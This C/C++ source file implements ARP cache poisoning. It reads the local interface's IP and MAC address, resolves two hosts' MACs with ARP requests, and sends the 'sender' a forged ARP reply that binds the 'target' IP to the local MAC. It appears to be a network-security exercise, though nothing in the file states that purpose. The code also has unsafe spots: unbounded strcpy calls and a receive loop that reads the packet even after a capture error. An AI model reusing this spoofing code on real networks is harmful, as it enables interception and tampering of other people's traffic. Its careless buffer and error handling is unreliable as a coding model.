#include "MyHeader.h"
int getIPAddress(char *ip_addr,char*dev){
    int sock;
    struct ifreq ifr;
    struct sockaddr_in *sin;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        return 0;
    }
    strcpy(ifr.ifr_name, dev);
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0){
        close(sock);
        return 0;
    }
    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(ip_addr, inet_ntoa(sin->sin_addr));
    close(sock);
    return 1;
}
void convrt_mac(const char *data, char *cvrt_str, int sz){
     char buf[128] = {0,};
     char t_buf[8];
     char *stp = strtok((char *)data , ":" );
     int temp=0;

     do{
          memset( t_buf, 0, sizeof(t_buf) );
          sscanf( stp, "%x", &temp );
          snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
          strncat( buf, t_buf, sizeof(buf)-1 );
          strncat( buf, ":", sizeof(buf)-1 );
     } while( (stp = strtok( NULL , ":" )) != NULL );

     buf[strlen(buf) -1] = '\0';
     strncpy( cvrt_str, buf, sz );
}
int getMacAddress(char *mac,char* dev){
    int sock;
    struct ifreq ifr;
    char mac_adr[18] = {0,};

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0){
       return 0;
    }
    strcpy(ifr.ifr_name, dev);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0){
        close(sock);
        return 0;
    }
    convrt_mac(ether_ntoa((struct ether_addr *)(ifr.ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr)-1);
    strcpy(mac, mac_adr);
    close(sock);

    return 1;
}

EthArpPacket FindMac(char* target,pcap_t* handle,char* my_ip, char* my_mac){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(BROADCAST);
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac(NONE);
    packet.arp_.tip_ = htonl(Ip(target));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(1){
        struct pcap_pkthdr* header;
        EthArpPacket* recv_packet;
        res = pcap_next_ex(handle, &header,(const u_char**)&recv_packet);
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        }
        if(recv_packet->eth_.type()!=0x806||recv_packet->arp_.op()!=2)continue;
        return *recv_packet;
    }
}

void arp(char* sender, char* target,pcap_t* handle,char* my_ip, char* my_mac){
    EthArpPacket send = FindMac(sender,handle,my_ip,my_mac);
    EthArpPacket targ = FindMac(target,handle,my_ip,my_mac);
    uint8_t* send_mac = send.arp_.smac().operator unsigned char *();
    uint8_t* targ_mac = targ.arp_.smac().operator unsigned char *();
    uint32_t send_ip = send.arp_.sip().operator unsigned int();
    uint32_t targ_ip = targ.arp_.sip().operator unsigned int();

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(send_mac);
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(targ_ip));
    packet.arp_.tmac_ = Mac(send_mac);
    packet.arp_.tip_ = htonl(Ip(send_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
